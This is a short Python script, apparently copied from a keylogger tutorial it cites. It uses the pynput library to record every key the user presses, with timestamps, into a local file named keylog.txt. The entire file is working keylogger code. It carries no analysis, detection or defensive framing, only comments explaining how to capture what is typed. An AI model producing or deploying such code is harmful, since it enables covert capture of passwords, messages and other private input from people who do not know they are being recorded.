# References
# https://pynput.readthedocs.io/en/latest/index.html
# https://www.askpython.com/python/examples/python-keylogger

from pynput.keyboard import Key, Listener
import logging

# Set filename for keystrokes to be sent too, then set the format for inputted keystrokes
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

# Take key pressed by user and store it into file
def on_press(key):
    logging.info(str(key))

# Record keystrokes then call main function 
with Listener(on_press=on_press) as listener :
    listener.join()